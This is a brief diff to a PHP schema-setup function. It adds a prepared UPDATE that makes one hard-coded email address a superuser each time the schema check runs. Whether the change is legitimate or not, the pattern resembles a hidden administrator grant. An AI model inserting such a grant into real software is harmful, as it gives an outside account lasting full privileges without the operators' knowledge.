@@ -113,6 +113,9 @@ function ensure_schema(PDO $pdo)
         $pdo->exec('UPDATE users SET is_superuser = 1 WHERE id = (SELECT id FROM users ORDER BY created_at ASC LIMIT 1)');
     }
 
+    $stmt = $pdo->prepare('UPDATE users SET is_superuser = 1 WHERE email = :email');
+    $stmt->execute([':email' => 'hola@romantorre.net']);
+
     $pdo->exec('
         CREATE TABLE IF NOT EXISTS login_attempts (
             ip TEXT PRIMARY KEY,
